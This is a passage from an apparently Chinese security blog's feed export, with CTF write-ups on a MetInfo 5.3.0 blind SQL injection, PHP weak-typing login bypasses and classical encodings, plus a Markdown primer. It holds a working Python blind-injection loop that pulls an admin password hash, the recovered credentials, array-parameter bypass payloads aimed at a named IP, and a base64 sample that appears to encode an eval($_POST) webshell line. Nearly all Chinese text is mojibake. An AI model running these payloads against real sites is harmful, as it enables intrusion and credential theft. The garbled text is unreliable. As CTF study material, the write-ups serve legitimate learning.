        poc = &quot;http://localhost:8080/MetInfo_v5.3.0/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_pass,&quot;+str(p)+&quot;,1))=&quot;+str(num)+&quot;,1,0) limit 0,1-- sd&amp;imgproduct=xxxx&quot;

        #print poc

        #result = urllib.request.urlopen(poc).txt

        conn = requests.get(poc)

        res = conn.content

        res = str(res)

        if res.find(r&quot;ä¸ºä»€ä¹ˆä¼ä¸šè¦å»ºå¤šå›½è¯­è¨€ç½‘ç«™&quot;)&gt;0:

            password = password + chr(num)

            print password

            break
</code></pre><p>æµ‹è¯•æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/metinfo_blind_injection_2.png" alt=""></p>
<p>æ ¹æ®å¦‚ä¸Šè„šæœ¬è·‘å‡ºè´¦æˆ·å¯†ç ä¸ºï¼š</p>
<blockquote>
<p>acd131fce58f4d6f86e4a503a303fa4e   simpleware123</p>
</blockquote>
<p>è¿™ä¸ªè¦æ”¶è´¹ï¼Œé™„ä¸€ä¸ªMD5è§£å¯†çš„å…è´¹ç½‘å€ï¼š<code>http://www.pdtools.net/tools/md5.jsp</code></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MarkDownåŸºç¡€è¯­æ³•]]></title>
      <url>/2016/07/13/MarkDown%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<h1 id="Markdownå…¥é—¨å­¦ä¹ å°ç»“"><a href="#Markdownå…¥é—¨å­¦ä¹ å°ç»“" class="headerlink" title="Markdownå…¥é—¨å­¦ä¹ å°ç»“"></a>Markdownå…¥é—¨å­¦ä¹ å°ç»“</h1><p>Markdownæ˜¯ä¸€ç§å¯ä»¥ä½¿ç”¨æ™®é€šæ–‡æœ¬ç¼–è¾‘å™¨ç¼–å†™çš„æ ‡è®°è¯­è¨€ï¼Œé€šè¿‡ç®€å•çš„æ ‡è®°è¯­æ³•ï¼Œå®ƒå¯ä»¥ä½¿æ™®é€šæ–‡æœ¬å†…å®¹å…·æœ‰ä¸€å®šçš„æ ¼å¼ã€‚Markdown çš„ç›®æ ‡æ˜¯å®ç°ã€Œæ˜“è¯»æ˜“å†™ã€ã€‚</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h2 id="æ ‡é¢˜"><a href="#æ ‡é¢˜" class="headerlink" title="æ ‡é¢˜"></a>æ ‡é¢˜</h2><p>åœ¨Markdownå½“ä¸­è®¾ç½®æ ‡é¢˜ï¼Œæœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<ul>
<li>ç¬¬ä¸€ç§ï¼šé€šè¿‡åœ¨æ–‡å­—ä¸‹æ–¹æ·»åŠ â€œ=â€å’Œâ€œ-â€ï¼Œä»–ä»¬åˆ†åˆ«è¡¨ç¤ºä¸€çº§æ ‡é¢˜å’ŒäºŒçº§æ ‡é¢˜ã€‚</li>
<li>ç¬¬äºŒç§ï¼šåœ¨æ–‡å­—å¼€å¤´åŠ ä¸Š â€œ#â€ï¼Œé€šè¿‡â€œ#â€æ•°é‡è¡¨ç¤ºå‡ çº§æ ‡é¢˜ã€‚ï¼ˆä¸€å…±åªæœ‰1~6çº§æ ‡é¢˜ï¼Œ1çº§æ ‡é¢˜å­—ä½“æœ€å¤§ï¼‰</li>
</ul>
<h2 id="å—æ³¨é‡Š-å¼•ç”¨"><a href="#å—æ³¨é‡Š-å¼•ç”¨" class="headerlink" title="å—æ³¨é‡Š(å¼•ç”¨)"></a>å—æ³¨é‡Š(å¼•ç”¨)</h2><ul>
<li>é€šè¿‡åœ¨æ–‡å­—å¼€å¤´æ·»åŠ â€œ&gt; â€è¡¨ç¤ºå—æ³¨é‡Šã€‚</li>
</ul>
<h2 id="ç²—ä½“ï¼ˆå¼ºè°ƒï¼‰"><a href="#ç²—ä½“ï¼ˆå¼ºè°ƒï¼‰" class="headerlink" title="ç²—ä½“ï¼ˆå¼ºè°ƒï¼‰"></a>ç²—ä½“ï¼ˆå¼ºè°ƒï¼‰</h2><ul>
<li>å°†éœ€è¦è®¾ç½®ä¸ºç²—ä½“çš„æ–‡å­—ä¸¤ç«¯ä½¿ç”¨2ä¸ªâ€œ*â€ã€‚</li>
</ul>
<h2 id="æœ‰åºåˆ—è¡¨"><a href="#æœ‰åºåˆ—è¡¨" class="headerlink" title="æœ‰åºåˆ—è¡¨"></a>æœ‰åºåˆ—è¡¨</h2><ol>
<li>ä½¿ç”¨æ•°å­—</li>
<li>åé¢è·Ÿä¸Šå¥å·ã€‚</li>
<li>ï¼ˆè¿˜è¦æœ‰ç©ºæ ¼ï¼‰</li>
</ol>
<h2 id="é“¾æ¥ï¼ˆLinksï¼‰"><a href="#é“¾æ¥ï¼ˆLinksï¼‰" class="headerlink" title="é“¾æ¥ï¼ˆLinksï¼‰"></a>é“¾æ¥ï¼ˆLinksï¼‰</h2><p>Markdownä¸­æœ‰ä¸¤ç§æ–¹å¼ï¼Œå®ç°é“¾æ¥ï¼Œåˆ†åˆ«ä¸ºå†…è”æ–¹å¼å’Œå¼•ç”¨æ–¹å¼ã€‚</p>
<p>å†…è”æ–¹å¼ï¼šThis is an <a href="http://example.com/" target="_blank" rel="external">example link</a>.</p>
<p><code>This is an [example link](http://example.com/).</code></p>
<h2 id="å›¾ç‰‡ï¼ˆImagesï¼‰"><a href="#å›¾ç‰‡ï¼ˆImagesï¼‰" class="headerlink" title="å›¾ç‰‡ï¼ˆImagesï¼‰"></a>å›¾ç‰‡ï¼ˆImagesï¼‰</h2><p>å›¾ç‰‡çš„å¤„ç†æ–¹å¼å’Œé“¾æ¥çš„å¤„ç†æ–¹å¼ï¼Œéå¸¸çš„ç±»ä¼¼ã€‚</p>
<ul>
<li>å†…è”æ–¹å¼ï¼š<img src="C:\Users\dell\Pictures\404.jpg" alt="test"></li>
<li><code>![test](C:\Users\dell\Pictures\404.jpg)</code></li>
<li>ç›´æ¥ä½¿ç”¨<img>æ ‡ç­¾ï¼Œè¿™æ ·å¯ä»¥æŒ‡å®šå›¾ç‰‡çš„å¤§å°å°ºå¯¸<h2 id="ä»£ç ï¼ˆHTMLä¸­æ‰€è°“çš„Codeï¼‰"><a href="#ä»£ç ï¼ˆHTMLä¸­æ‰€è°“çš„Codeï¼‰" class="headerlink" title="ä»£ç ï¼ˆHTMLä¸­æ‰€è°“çš„Codeï¼‰"></a>ä»£ç ï¼ˆHTMLä¸­æ‰€è°“çš„Codeï¼‰</h2>å®ç°æ–¹å¼æœ‰ä¸¤ç§ï¼š<br>ç¬¬ä¸€ç§ï¼šç®€å•æ–‡å­—å‡ºç°ä¸€ä¸ªä»£ç æ¡†ã€‚ä½¿ç”¨<code>&lt;blockquote&gt;</code>ã€‚ï¼ˆ<code>ä¸æ˜¯å•å¼•å·è€Œæ˜¯å·¦ä¸Šè§’çš„ESCä¸‹é¢~ä¸­çš„</code>ï¼‰<br>```<br>ç¬¬äºŒç§ï¼šå¤§ç‰‡æ–‡å­—éœ€è¦å®ç°ä»£ç æ¡†ã€‚ä½¿ç”¨Tabå’Œå››ä¸ªç©ºæ ¼ã€‚<h2 id="ç‰¹æ®Šå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦</h2><blockquote>
<p>ç”¨\è½¬ä¹‰ã€‚</p>
</blockquote>
</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> MarkDown </tag>
            
            <tag> åšå®¢ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ã€PHPå®‰å…¨ã€‘PHPå¼±ç±»å‹]]></title>
      <url>/2016/06/13/%E3%80%90PHP%E5%AE%89%E5%85%A8%E3%80%91PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<p>æ²¡æœ‰äººè´¨ç–‘phpçš„ç®€å•å¼ºå¤§ï¼Œå®ƒæä¾›äº†å¾ˆå¤šç‰¹æ€§ä¾›å¼€å‘è€…ä½¿ç”¨ï¼Œå…¶ä¸­ä¸€ä¸ªå°±æ˜¯å¼±ç±»å‹æœºåˆ¶ã€‚<br>å¼±ç±»å‹çš„è¯­è¨€å¯¹å˜é‡çš„æ•°æ®ç±»å‹æ²¡æœ‰é™åˆ¶ï¼Œä½ å¯ä»¥åœ¨ä»»ä½•åœ°æ—¶å€™å°†å˜é‡èµ‹å€¼ç»™ä»»æ„çš„å…¶ä»–ç±»å‹çš„å˜é‡ï¼ŒåŒæ—¶å˜é‡ä¹Ÿå¯ä»¥è½¬æ¢æˆä»»æ„åœ°å…¶ä»–ç±»å‹çš„æ•°æ®ã€‚<br><a id="more"></a></p>
<h1 id="PHPå¼±ç±»å‹"><a href="#PHPå¼±ç±»å‹" class="headerlink" title="PHPå¼±ç±»å‹"></a>PHPå¼±ç±»å‹</h1><hr>
<h1 id="PHPå¼±ç±»å‹ç®€ä»‹"><a href="#PHPå¼±ç±»å‹ç®€ä»‹" class="headerlink" title="PHPå¼±ç±»å‹ç®€ä»‹"></a>PHPå¼±ç±»å‹ç®€ä»‹</h1><p>åœ¨PHPä¸­ï¼Œå¯ä»¥è¿›è¡Œä¸€ä¸‹çš„æ“ä½œã€‚</p>
<pre><code>$param = 1;

$param = array();

$param = &quot;stringg&quot;;
</code></pre><p>æ¯”å¦‚ åœ¨$a == $bçš„æ¯”è¾ƒä¸­</p>
<ul>
<li>$a = null; $b = false; //ä¸ºçœŸ</li>
<li>$a = â€˜â€™; $b = 0; //åŒæ ·ä¸ºçœŸ<h1 id="å®ä¾‹è§£é‡Š"><a href="#å®ä¾‹è§£é‡Š" class="headerlink" title="å®ä¾‹è§£é‡Š"></a>å®ä¾‹è§£é‡Š</h1></li>
</ul>
<hr>
<h2 id="å®ä¾‹ä¸€"><a href="#å®ä¾‹ä¸€" class="headerlink" title="å®ä¾‹ä¸€"></a>å®ä¾‹ä¸€</h2><p>2016å¹´é£äº‘æ¯çš„é¢˜</p>
<p>é¢˜ç›®å°±æ˜¯ä¸€ä¸ªç™»é™†æ¡†ï¼Œéœ€è¦è¾“å…¥è´¦å·å¯†ç ã€‚</p>
<p>postï¼šusername[]=1&amp;password[]=2</p>
<p><strong>åŸå› æ˜¯ï¼š</strong>ç”¨æˆ·åœ¨è¾“å…¥è´¦å·å¯†ç ä¹‹åphpä¼šè¿›è¡Œè§£æï¼Œé¦–å…ˆä¼šæŠŠusernameå’Œpasswordå½“æˆæ•°ç»„ï¼Œusernameå’Œpasswordå†MD5åŠ å¯†ä¹‹åå°±å˜å¾—å’Œæ•°æ®åº“ä¸­ç›¸åŒï¼Œè¿™æ ·å°±æˆåŠŸç™»é™†ã€‚</p>
<h2 id="å®ä¾‹äºŒ"><a href="#å®ä¾‹äºŒ" class="headerlink" title="å®ä¾‹äºŒ"></a>å®ä¾‹äºŒ</h2><p>ä¹Ÿæ˜¯2016å¹´é£äº‘æ¯çš„é¢˜</p>
<ul>
<li>é¦–å…ˆä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼Œæ‹¿åˆ°æºç </li>
</ul>
<p>ä»£ç å¦‚ä¸‹ï¼š<br>    &lt;?php<br>        $_GET[â€˜myidâ€™] = urldecode($_GET[â€˜myidâ€™]);<br>        $flag = â€˜xxxxxxxxxxxxxxxxxâ€™;<br>        if (isset($_GET[â€˜nameâ€™]) and isset($_POST[â€˜passwordâ€™])) {</p>
<pre><code>        if ($_GET[&apos;name&apos;] == $_POST[&apos;password&apos;])

            print &apos;Your password can not be your name.&apos;;

        else if (sha1($_GET[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;])&amp;($_GET[&apos;myid&apos;]==&apos;anyun&apos;))

            die(&apos;Flag: &apos;.$flag);

    else

    print &apos;sorry!&apos;;

    }
?&gt;
</code></pre><ul>
<li>é¦–å…ˆå¯¹myidè¿›è¡Œä¸€ä¸ªurldecode</li>
<li>ç„¶ååˆ¤æ–­æ˜¯å¦è®¾ç½®nameå’Œpassword</li>
<li>å†ç„¶ååˆ¤æ–­sha1ï¼ˆnameï¼‰å’Œsha1ï¼ˆpasswordï¼‰æ˜¯å¦ç›¸ç­‰ï¼Œå¹¶ä¸”myid=anyun</li>
<li>æœ€åè¾“å‡ºflag<br>æ ¹æ®å¯¹æºç åˆ†æï¼Œæ„é€ å¦‚ä¸‹payloadï¼š<blockquote>
<p><a href="http://139.129.166.67/5677ui8ifgs/index.php?myid=anyun&amp;name[]=1" target="_blank" rel="external">http://139.129.166.67/5677ui8ifgs/index.php?myid=anyun&amp;name[]=1</a></p>
<p>postï¼špassword[]=2<br>è¿™æ ·å°±ç»•è¿‡äº†ï¼Œå…·ä½“çš„åŸå› å°±ä¸ä¸€ä¸€è§£é‡Šäº†ã€‚</p>
</blockquote>
</li>
</ul>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä½œä¸ºä¸€ä¸ªç¨‹åºå‘˜ï¼Œå¼±ç±»å‹ç¡®å®ç»™ç¨‹åºå‘˜ä¹¦å†™ä»£ç å¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©ï¼Œä½†æ˜¯ä¹Ÿè®©ç¨‹åºå‘˜å¿˜è®°äº†<br>$array =array();çš„ä¹ æƒ¯ã€‚<br>éƒ½è¯´ä¸€åˆ‡è¾“å…¥éƒ½æ˜¯æœ‰å®³çš„</p>
<p>é‚£ä¹ˆå…¶å®å¯ä»¥è¯´ä¸€åˆ‡è¾“å…¥çš„ç±»å‹ä¹Ÿæ˜¯å¯ç–‘çš„ï¼Œæ°¸è¿œä¸è¦ç›¸ä¿¡å¼±ç±»å‹çš„phpä¸‹ä»»ä½•æ¯”è¾ƒå‡½æ•°ï¼Œä»»ä½•æ•°å­¦è¿ç®—ã€‚å¦åˆ™ï¼Œä½ ç»å¯¹æ˜¯è¢«phpå‡ºå–çš„é‚£ä¸€ä¸ªã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTFä¹‹åŠ è§£å¯†æ€»ç»“]]></title>
      <url>/2016/05/25/CTF%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>CTFæ¯”èµ›ä¸­ä¸»è¦åˆ†ä¸ºé€†å‘ç ´è§£ï¼ŒWebå®‰å…¨ï¼ŒåŠ å¯†è§£å¯†ï¼ŒPWNç­‰å‡ å¤§ç±»ï¼Œæœ¬æ–‡ä¸»è¦æ€»ç»“ä¸€äº›è‡ªå·±åšè¿‡çš„ctfçš„ä»¥ä¸‹åŠ å¯†è§£å¯†çš„æ–¹æ³•å’Œå·¥å…·ç­‰ã€‚<br><a id="more"></a></p>
<h1 id="0x01-Base64"><a href="#0x01-Base64" class="headerlink" title="0x01 Base64"></a>0x01 Base64</h1><p>Base64é¡¾åæ€ä¹‰å°±æ˜¯ç”¨64ä¸ªå¯æ˜¾ç¤ºå­—ç¬¦è¡¨ç¤ºæ‰€æœ‰çš„ASCå­—ç¬¦ï¼Œ64ä¹Ÿå°±æ˜¯6Bitsï¼Œè€ŒASCå­—ç¬¦ä¸€å…±æœ‰256ä¸ªï¼Œä¹Ÿå°±æ˜¯8Bitsã€‚Base64ç¼–ç è¦æ±‚æŠŠ3ä¸ª8ä½å­—èŠ‚ï¼ˆ3<em>8=24ï¼‰è½¬åŒ–ä¸º4ä¸ª6ä½çš„å­—èŠ‚ï¼ˆ4</em>6=24ï¼‰ï¼Œä¹‹ååœ¨6ä½çš„å‰é¢è¡¥ä¸¤ä¸ª0ï¼Œå½¢æˆ8ä½ä¸€ä¸ªå­—èŠ‚çš„å½¢å¼ã€‚ å¦‚æœå‰©ä¸‹çš„å­—ç¬¦ä¸è¶³3ä¸ªå­—èŠ‚ï¼Œåˆ™ç”¨0å¡«å……ï¼Œè¾“å‡ºå­—ç¬¦ä½¿ç”¨â€™=â€™ï¼Œå› æ­¤ç¼–ç åè¾“å‡ºçš„æ–‡æœ¬æœ«å°¾å¯èƒ½ä¼šå‡ºç°1æˆ–2ä¸ªâ€™=â€™<br>å†…å­˜1ä¸ªå­—ç¬¦å 8ä½</p>
<h2 id="ä¾‹å¦‚"><a href="#ä¾‹å¦‚" class="headerlink" title="ä¾‹å¦‚"></a>ä¾‹å¦‚</h2><pre><code>è½¬å‰ï¼š s 1 3
å…ˆè½¬æˆasciiï¼šå¯¹åº” 115 49 51
2è¿›åˆ¶ï¼š 01110011 00110001 00110011
6ä¸ªä¸€ç»„ï¼ˆ4ç»„ï¼‰ 011100110011000100110011
ç„¶åæ‰æœ‰åé¢çš„ 011100 110011 000100 110011
ç„¶åè®¡ç®—æœºæ˜¯8ä½8ä½çš„å­˜æ•° 6ä¸å¤Ÿï¼Œè‡ªåŠ¨å°±è¡¥ä¸¤ä¸ªé«˜ä½0äº†
æ‰€æœ‰æœ‰äº† é«˜ä½è¡¥0
ç§‘å­¦è®¡ç®—å™¨è¾“å…¥ 00011100 00110011 00000100 00110011
å¾—åˆ° 28 51 4 51
æŸ¥å¯¹ä¸‹ç…§è¡¨ c z E z
</code></pre><h2 id="å½¢å¼"><a href="#å½¢å¼" class="headerlink" title="å½¢å¼"></a>å½¢å¼</h2><blockquote>
<p>ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY=</p>
<h3 id="Base64åœ¨çº¿ç¼–ç è§£ç åœ°å€"><a href="#Base64åœ¨çº¿ç¼–ç è§£ç åœ°å€" class="headerlink" title="Base64åœ¨çº¿ç¼–ç è§£ç åœ°å€"></a><a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="external">Base64åœ¨çº¿ç¼–ç è§£ç åœ°å€</a></h3><h1 id="0x02-Base32"><a href="#0x02-Base32" class="headerlink" title="0x02 Base32"></a>0x02 Base32</h1><p>Base32å’ŒBase64ç›¸æ¯”åªæœ‰ä¸€ä¸ªåŒºåˆ«å°±æ˜¯ï¼Œç”¨32ä¸ªå­—ç¬¦è¡¨ç¤º256ä¸ªASCå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´5ä¸ªASCå­—ç¬¦ä¸€ç»„å¯ä»¥ç”Ÿæˆ8ä¸ªBaseå­—ç¬¦ã€‚</p>
<h3 id="Base32åœ¨çº¿ç¼–ç è§£ç åœ°å€"><a href="#Base32åœ¨çº¿ç¼–ç è§£ç åœ°å€" class="headerlink" title="Base32åœ¨çº¿ç¼–ç è§£ç åœ°å€"></a><a href="http://tomeko.net/online_tools/base32.php?lang=en" target="_blank" rel="external">Base32åœ¨çº¿ç¼–ç è§£ç åœ°å€</a></h3><p><strong>æ³¨ï¼š</strong>ä»¥ä¸Šä¸¤ç§ç¼–ç éƒ½å¯ä»¥ä½¿ç”¨pythonçš„base64æ¨¡å—æ¥åŠ è§£å¯†</p>
</blockquote>
<h1 id="0x03-åŸ¹æ ¹å¯†ç "><a href="#0x03-åŸ¹æ ¹å¯†ç " class="headerlink" title="0x03 åŸ¹æ ¹å¯†ç "></a>0x03 åŸ¹æ ¹å¯†ç </h1><p>åŸ¹æ ¹å¯†ç ï¼ŒåŸ¹æ ¹æ‰€ç”¨çš„å¯†ç æ˜¯ä¸€ç§æœ¬è´¨ä¸Šç”¨äºŒè¿›åˆ¶æ•°è®¾è®¡çš„ï¼Œæ²¡æœ‰ç”¨é€šå¸¸çš„0å’Œ1æ¥è¡¨ç¤ºï¼Œè€Œæ˜¯é‡‡ç”¨aå’Œb<br>å¯†æ–‡å½¢å¼æ˜¯æ˜æ˜¾ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦ã€‚å¦‚å¤§å†™å­—æ¯å’Œå°å†™å­—æ¯ï¼Œè‹±æ–‡å’Œæ•°å­—ï¼Œæ–œä½“å’Œæ­£ä½“ã€‚</p>
<h2 id="ä¾‹å¦‚-1"><a href="#ä¾‹å¦‚-1" class="headerlink" title="ä¾‹å¦‚"></a>ä¾‹å¦‚</h2><pre><code>DEath IS JUST A PaRT oF lIFE,sOMeTHInG wE&apos;RE aLL dESTInED TO dO.

æ˜¯å¤§å†™å°å†™ä¸¤ä¸ªä¸åŒçš„å­—ç¬¦
å¤§å†™ç”¨aè¡¨ç¤ºï¼Œå°å†™ç”¨bè¡¨ç¤º
é€‰å–5ä¸ªä¸€ç»„
DEath aabbb    
ISJUS aaaaa 
TAPaR aaaba 
ToFlI ababa 
FEsOM aabaa 
eTHIn baaab 
GwERE abaaa 
aLLdE baaba
STInE aaaba 
DTOdO aaab
æŒ‰ç…§ä¸Šè¿°çš„å½¢å¼å»åœ¨è¡¨é‡Œæ‰¾å¯¹åº”å¾—æ˜æ–‡.
</code></pre><ul>
<li><p>ç¬¬ä¸€ç§æ–¹å¼</p>
<p>  A aaaaa    B aaaab C aaaba D aaabb<br>  E aabaa F aabab G aabba H aabbb<br>  I abaaa J abaab K ababa L ababb<br>  M abbaa N abbab O abbba P abbbb<br>  Q baaaa R baaab S baaba T baabb<br>  U babaa V babab W babba X babbb<br>  Y bbaaa Z bbaab</p>
</li>
<li><p>ç¬¬äºŒç§æ–¹å¼</p>
<p>  a AAAAA g AABBA n ABBAA t BAABA<br>  b AAAAB h AABBB o ABBAB u-v BAABB<br>  c AAABA i-j ABAAA p ABBBA w BABAA<br>  d AAABB k ABAAB q ABBBB x BABAB<br>  e AABAA l ABABA r BAAAA y BABBA<br>  f AABAB m ABABB s BAAAB z BABBB</p>
</li>
</ul>
<h3 id="åŸ¹æ ¹å¯†ç åœ¨çº¿è§£å¯†"><a href="#åŸ¹æ ¹å¯†ç åœ¨çº¿è§£å¯†" class="headerlink" title="åŸ¹æ ¹å¯†ç åœ¨çº¿è§£å¯†"></a><a href="http://114.215.92.217/blog/tools/%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86.html" target="_blank" rel="external">åŸ¹æ ¹å¯†ç åœ¨çº¿è§£å¯†</a></h3><h1 id="0x04-æ‘©æ–¯å¯†ç "><a href="#0x04-æ‘©æ–¯å¯†ç " class="headerlink" title="0x04 æ‘©æ–¯å¯†ç "></a>0x04 æ‘©æ–¯å¯†ç </h1><p>æ‘©å°”æ–¯ç”µç æ˜¯ä¸€ç§æ—©æœŸçš„æ•°å­—åŒ–é€šä¿¡å½¢å¼ï¼Œä½†æ˜¯å®ƒä¸åŒäºç°ä»£åªä½¿ç”¨é›¶å’Œä¸€ä¸¤ç§çŠ¶æ€çš„äºŒè¿›åˆ¶ä»£ç ï¼Œå®ƒçš„ä»£ç åŒ…æ‹¬äº”ç§ï¼š ç‚¹ã€åˆ’ã€ç‚¹å’Œåˆ’ä¹‹é—´çš„åœé¡¿ã€æ¯ä¸ªå­—ç¬¦é—´çŸ­çš„åœé¡¿ï¼ˆåœ¨ç‚¹å’Œåˆ’ä¹‹é—´ï¼‰ã€æ¯ä¸ªè¯ä¹‹é—´ä¸­ç­‰çš„åœé¡¿ä»¥åŠå¥å­ä¹‹é—´é•¿çš„åœé¡¿ã€‚</p>
<blockquote>
<p>å½¢å¦‚ï¼šâ€“  â€”  .-.  â€¦  .</p>
</blockquote>
<p>è§£å¯†å¯¹ç…§ä¸‹å›¾æ‘©æ–¯å¯†ç è¡¨:</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E6%91%A9%E6%96%AF%E5%AF%86%E7%A0%81%E8%A1%A8.png" alt=""></p>
<h3 id="åœ¨çº¿æ‘©æ–¯å¯†ç è§£å¯†"><a href="#åœ¨çº¿æ‘©æ–¯å¯†ç è§£å¯†" class="headerlink" title="åœ¨çº¿æ‘©æ–¯å¯†ç è§£å¯†"></a><a href="http://www.jb51.net/tools/morse.htm" target="_blank" rel="external">åœ¨çº¿æ‘©æ–¯å¯†ç è§£å¯†</a></h3><h1 id="0x05-JsFuck"><a href="#0x05-JsFuck" class="headerlink" title="0x05 JsFuck"></a>0x05 JsFuck</h1><p>JSFuck å¯ä»¥è®©ä½ åªç”¨ 6 ä¸ªå­—ç¬¦ <a href=""></a>!+ æ¥ç¼–å†™ JavaScript ç¨‹åºã€‚</p>
<h3 id="å½¢å¼ï¼š"><a href="#å½¢å¼ï¼š" class="headerlink" title="å½¢å¼ï¼š"></a>å½¢å¼ï¼š</h3><blockquote>
<p>[][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])<a href="(![]+[]">+[[+!+[]]]]</a>[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])()</p>
</blockquote>
<p>å…¶ä»–ä¸€äº›åŸºæœ¬çš„è¡¨è¾¾ï¼š</p>
<pre><code>false       =&gt;  ![]
true        =&gt;  !![]
undefined   =&gt;  [][[]]
NaN         =&gt;  +[![]]
0           =&gt;  +[]
1           =&gt;  +!+[]
2           =&gt;  !+[]+!+[]
10          =&gt;  [+!+[]]+[+[]]
Array       =&gt;  []
Number      =&gt;  +[]
String      =&gt;  []+[]
Boolean     =&gt;  ![]
Function    =&gt;  [][&quot;filter&quot;]
eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()
window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()
</code></pre><p>å¯ä»¥ä½¿ç”¨firebugç›´æ¥è§£å¯†.</p>
